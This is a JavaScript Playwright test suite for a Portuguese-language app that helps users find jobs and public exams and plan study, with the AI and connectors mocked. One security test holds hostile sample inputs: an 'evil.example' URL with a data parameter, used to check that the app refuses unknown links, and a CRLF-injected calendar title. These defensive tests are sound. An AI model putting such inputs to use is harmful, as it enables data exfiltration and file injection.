/* Testes do app Yaad1 (projetos/sala-caverna/index.html), com IA, conectores, ditado e voz SIMULADOS.
   Uso: node ferramentas/testes/yaad1.test.js   (sai com código 1 se algo falhar)
   Cada cenário abre o app do zero em 375 e 390 px e confere: comportamento, ausência de erros e de rolagem lateral.
   Dados de teste fictícios; nada é enviado a serviço nenhum. */
const { chromium } = require("playwright");
const path = require("path");
const APP = "file://" + path.resolve(__dirname, "../../projetos/sala-caverna/index.html");
const LARGURAS = [375, 390];
let falhas = 0, passos = 0;
const ok = (cond, msg) => { passos++; if (!cond) { falhas++; console.log("  ✗ " + msg); } };

/* Simulações reaproveitadas pelos cenários */
const MOCKS = () => {
  const job = (id, name, city, dl, sal) => ({ id, name, careerPageName: "Empresa " + id, type: "vacancy_type_effective", publishedDate: "2026-11-25T19:31:27.846Z", applicationDeadline: dl, city, state: "Roraima", jobUrl: "https://x.gupy.io/job/" + id, workplaceType: "on-site", description: "Requisitos: Excel; Power BI é diferencial.", salary: sal ? { status: "disclosed", label: "Salário: R$ 3.034,02/mês" } : { status: "not_disclosed", label: "" } });
  window.__chamadas = [];
  LIMITS = { tools: true };
  MCP = {
    describeTool: async () => ({ inputSchema: { properties: { objective: { type: "string" }, urls: { type: "array" } }, required: ["objective"] } }),
    callTool: async (server, tool, input) => {
      window.__chamadas.push(server + ":" + tool);
      if (server === "Gupy" && tool === "search_jobs") return { payload: { data: { data: [job(1, "Assistente Administrativo", "Boa Vista", "2026-12-15", true), job(2, "Atendente", "Iracema", "2026-12-20"), job(3, "Vaga vencida", "Boa Vista", "2026-11-01")], pagination: { total: 83 } } } };
      if (server === "Gupy" && tool === "get_job_by_id") return { payload: { data: job(input.id, "Assistente Administrativo", "Boa Vista", "2026-12-15", true) } };
      if (tool === "tomtom-geocode") return { payload: { features: [{ geometry: { coordinates: input.query.startsWith("Iracema") ? [-61.05, 2.17] : [-60.67, 2.82] } }] } };
      if (tool === "tomtom-routing") return { payload: { features: [{ properties: { summary: { lengthInMeters: 98000, travelTimeInSeconds: 5100 } } }] } };
      return { payload: { results: [] } };
    }
  };
  const resp = (pr) => {
    if (/liga a pessoa a oportunidades REAIS/.test(pr)) return { itens: [{ tipo: "seletivo", titulo: "Recenseador do IBGE", onde: "Iracema - RR", salario: "R$ 1.741", inscricao_ate: "2026-11-30", prova: "2027-01-31", porque: "Renda perto.", url: "https://www.ibge.gov.br/x" }] };
    if (/LEIA o edital oficial/.test(pr)) return { titulo: "Recenseador IBGE", prova: "2027-01-31", banca: "Cesgranrio", corte: "18 de 60 pontos", materias: [{ n: "Língua Portuguesa", questoes: 15, topicos: ["Interpretação"] }, { n: "Matemática", questoes: 15, topicos: ["Porcentagem"] }], marcos: [{ r: "Inscrição até", d: "2026-11-30" }, { r: "Prova", d: "2027-01-31" }] };
    if (/SALA VIVA/.test(pr)) return { cenas: [{ quem: "professor", fala: "Vamos isolar o x." }, { quem: "professor", fala: "Sua vez.", pausa: { p: "3x=9, x=?", o: ["3", "6", "9"], c: 0, porque: "9/3=3." } }] };
    if (/Crie 6 questões/.test(pr)) return { qs: Array.from({ length: 6 }, (_, i) => ({ mat: i % 2 ? "Matemática" : "Língua Portuguesa", tema: "T" + i, p: "Q" + i, o: ["A", "B", "C", "D", "E"], c: i % 5, e: "Porque." })) };
    if (/Resolva cada questão/.test(pr)) return { r: [0, 1, 2, 3, 4, 9] };
    if (/Prepare uma CANDIDATURA/.test(pr)) return { aderencia: { nota: "média", atende: ["Excel"], parcial: [], falta: ["TOTVS"] }, curriculo: "RESUMO\n[COMPLETAR: telefone]", mensagem: "Olá.", perguntas: [{ p: "Fale de você.", como_responder: "Conte." }], antes_de_enviar: ["Telefone"], cuidado: "TOTVS." };
    return { titulo: "Aula", ideia: "x", passos: [{ t: "P", txt: "t" }], exemplo: { enunciado: "a", resolucao: "b" }, quadro: "2x=4", armadilhas: [], treino: [] };
  };
  const fn = async (turns, opts) => { const T = Object.fromEntries((opts.tools || []).map(t => [t.name, t])); if (T.propor_ritmo) await T.propor_ritmo.execute({ ritmo: "manter", dias: 14, motivo: "trabalho" }); const t = "Deixei pronto para você confirmar."; if (opts.onText) opts.onText({ text: t }); return { text: t }; };
  fn.json = async (pr) => resp(pr); fn.limits = async () => ({});
  SAMPLE = fn;
  M.profile.local = { cidade: "Iracema", uf: "RR" };
};

async function abrir(b, w) {
  const ctx = await b.newContext({ viewport: { width: w, height: 860 } });
  const p = await ctx.newPage(); const erros = [];
  p.on("pageerror", e => erros.push(e.message));
  await p.clock.install({ time: new Date(2026, 10, 27, 10, 5) });
  await p.goto(APP); await p.waitForTimeout(700);
  await p.evaluate(MOCKS);
  return { p, ctx, erros };
}
const semRolagem = async (p, w) => (await p.evaluate(() => document.documentElement.scrollWidth)) <= w;

const CENARIOS = {
  "Início carrega com o passo de hoje": async (p) => {
    await p.evaluate(() => { TAB = "hoje"; render(); });
    ok(!!(await p.$(".hero")), "tela inicial sem o destino (hero)");
    ok(!!(await p.$(".passo-big")), "sem o cartão do passo de hoje");
  },
  "Oportunidades: Gupy, distância, vencidas fora, cidade primeiro": async (p) => {
    await p.evaluate(() => { M.oport = {}; openOportunidades("perto"); }); await p.waitForTimeout(900);
    const cards = await p.$$eval(".op-card", cs => cs.map(c => c.textContent));
    ok(cards.some(t => /Recenseador do IBGE/.test(t)), "resultado do Claude ausente");
    ok(cards.some(t => /Vaga real · Gupy/.test(t)), "vaga da Gupy ausente");
    ok(!cards.some(t => /Vaga vencida/.test(t)), "vaga vencida apareceu");
    ok(cards.some(t => /de carro/.test(t)), "distância de carro ausente");
  },
  "Quero essa → frente com passo de hoje": async (p) => {
    await p.evaluate(() => { M.oport = { perto: { data: "2026-11-27", itens: [{ tipo: "seletivo", titulo: "Recenseador do IBGE", onde: "Iracema - RR", inscricao_ate: "2026-11-30", prova: "2027-01-31", url: "https://www.ibge.gov.br/x" }] } }; openOportunidades("perto"); });
    await p.click('[data-op="quero"]'); await p.waitForTimeout(400);
    for (let i = 0; i < 5; i++) { await p.click('[data-sh="next"]'); await p.waitForTimeout(120); }
    ok(await p.evaluate(() => frentes().length === 1 && frentes()[0].banca === "Cesgranrio"), "frente não criada com a banca do edital");
    ok(/Língua Portuguesa|Matemática/.test(await p.textContent(".passo-big")), "passo de hoje não aponta matéria da frente");
  },
  "Minha vida mudou: proposta, aplicar e recusar": async (p) => {
    await p.evaluate(() => { M.frentes = [{ id: "fx", titulo: "IBGE", materias: [{ n: "Matemática", questoes: 15, topicos: [] }], marcos: [], min: 40, dias: [1, 2, 3, 4, 5], criada: "2026-11-26", ok: {} }]; openVida(); });
    await p.click('[data-pick="tipo"] [data-v="emprego"]'); await p.click('[data-sh="next"]');
    await p.click('[data-pick="min"] [data-v="20"]'); await p.click('[data-sh="next"]'); await p.waitForTimeout(80);
    ok(/Manter/.test(await p.textContent(".rc")), "proposta sem o ritmo Manter");
    await p.click('[data-sh="next"]'); await p.waitForTimeout(80);
    ok(await p.evaluate(() => M.rota.marcha === "manter" && M.frentes[0].min === 20), "aplicar não mudou o ritmo e o tempo");
    await p.evaluate(() => openVida()); await p.click('[data-pick="tipo"] [data-v="pesada"]'); await p.click('[data-sh="next"]'); await p.click('[data-sh="next"]'); await p.click('[data-vd="nao"]');
    ok(await p.evaluate(() => M.rota.marcha === "manter" && M.rota.planos.some(x => x.status === "recusado")), "recusar alterou algo ou não registrou");
  },
  "Sua preparação: gabarito conferido e domínio real": async (p) => {
    await p.evaluate(() => { M.frentes = [{ id: "fx", titulo: "IBGE", banca: "Cesgranrio", materias: [{ n: "Língua Portuguesa", questoes: 15, topicos: [] }, { n: "Matemática", questoes: 15, topicos: [] }], marcos: [], min: 40, dias: [1, 2, 3, 4, 5], criada: "2026-11-26", ok: {} }]; TAB = "hoje"; render(); });
    await p.click('[data-act="pq-gerar"]'); await p.waitForTimeout(400);
    ok(await p.evaluate(() => M.prep.fx.pool.length === 5), "questão com gabarito divergente não foi descartada");
    await p.click('.prep [data-act="pq"][data-j="4"]'); await p.waitForTimeout(80);
    ok(await p.evaluate(() => M.prep.fx.resp.length === 1 && (M.erros || []).length === 1), "resposta errada não registrada na Forja");
  },
  "Sala viva: pausa bloqueia e Pergunte à turma": async (p) => {
    await p.evaluate(() => { const ks = Object.keys(SUBJ); openStudy({ dstr: iso(today()), b: null, livre: true, mat: ks[0], topic: "Equações" }); FLOW.at = FLOW.steps.indexOf("aula"); drawStudy(); });
    await p.waitForTimeout(300); await p.click('[data-act="sala"]'); await p.waitForTimeout(300);
    await p.click('[data-sl="next"]'); await p.waitForTimeout(100);
    ok(await p.isDisabled('[data-sl="next"]'), "pausa não bloqueou a próxima cena");
  },
  "Assistente: ferramenta propõe e só aplica com toque": async (p) => {
    await p.evaluate(() => { TAB = "hoje"; render(); openChat(); });
    await p.fill("#chi", "Arrumei um trabalho"); await p.press("#chi", "Enter"); await p.waitForTimeout(250);
    ok(await p.evaluate(() => (M.rota || {}).marcha !== "manter"), "mudou o ritmo antes do toque");
    await p.click('.acao [data-ac="sim"]'); await p.waitForTimeout(80);
    ok(await p.evaluate(() => M.rota.marcha === "manter"), "Aplicar não mudou o ritmo");
  },
  "FSRS: intervalos e limite da prova": async (p) => {
    const r = await p.evaluate(() => { M.frentes = []; const a = fsrsNext(null, 3, "2026-11-27"); const b = fsrsNext(a.card, 3, a.due); M.frentes = [{ id: "fx", titulo: "X", materias: [], marcos: [{ r: "Prova", d: "2026-12-10" }], min: 40, dias: [1], criada: "2026-11-26", ok: {} }]; const c = fsrsNext({ S: 60, D: 5, last: "2026-11-20" }, 3, "2026-11-27"); return [a.ivl, b.ivl, c.ivl]; });
    ok(r[0] === 4 && r[1] === 15, "intervalos do FSRS fora do esperado: " + r);
    ok(r[2] <= 12, "FSRS agendou depois da prova");
  },
  "Segurança: link desconhecido recusado e .ics blindado": async (p) => {
    const r = await p.evaluate(async () => {
      const tools = await ferramentasBusca(); const ler = tools.find(t => t.name === "ler_pagina");
      const recusa = ler ? await ler.execute({ url: "https://evil.example/?d=dados", objetivo: "x" }) : "sem ferramenta";
      const f = { id: "fx", titulo: "IBGE;X\r\nURL:https://evil.example", materias: [], marcos: [{ r: "Prova", d: "2026-12-10" }], min: 40, dias: [1], criada: "2026-11-26", ok: {} };
      return { recusa, ics: icsDaFrente(f) };
    });
    ok(/recusado/i.test(r.recusa), "ler_pagina leu um link que não veio das buscas");
    ok(!/\r\nURL:/.test(r.ics) && /IBGE\\;X/.test(r.ics), ".ics aceitou uma linha injetada ou não escapou o ponto e vírgula");
  },
  "Candidatura: pacote e acompanhamento": async (p) => {
    await p.evaluate(() => { M.curriculo = "Pastor há 8 anos, finanças da igreja. Excel e Power BI."; M.oport = { perto: { data: "2026-11-27", itens: [{ tipo: "vaga", titulo: "Assistente Administrativo", orgao: "SJMR", onde: "Boa Vista - RR", inscricao_ate: "2026-12-15", url: "https://x.gupy.io/job/1", fonte: "gupy", gid: 1, dist: null }] } }; openOportunidades("perto"); });
    await p.click('[data-op="cand"]'); await p.waitForTimeout(400);
    ok(/COMPLETAR/.test(await p.textContent("#shb")), "currículo adaptado não apareceu");
    await p.click('[data-pick="cst"] [data-v="enviada"]');
    ok(await p.evaluate(() => conquistas().find(c => c.n === "Primeira candidatura").got), "conquista da candidatura não acendeu");
  }
};

(async () => {
  const b = await chromium.launch();
  for (const [nome, fn] of Object.entries(CENARIOS)) {
    for (const w of LARGURAS) {
      const antes = falhas; const { p, ctx, erros } = await abrir(b, w);
      try { await fn(p); } catch (e) { falhas++; console.log("  ✗ exceção: " + e.message.split("\n")[0]); }
      ok(erros.length === 0, "erros de JavaScript: " + erros.join(" | "));
      ok(await semRolagem(p, w), "rolagem lateral em " + w + "px");
      console.log((falhas === antes ? "✓ " : "✗ ") + nome + " (" + w + "px)");
      await ctx.close();
    }
  }
  await b.close();
  console.log(`\n${passos - falhas}/${passos} verificações ok` + (falhas ? ` · ${falhas} FALHA(S)` : ""));
  process.exit(falhas ? 1 : 0);
})();
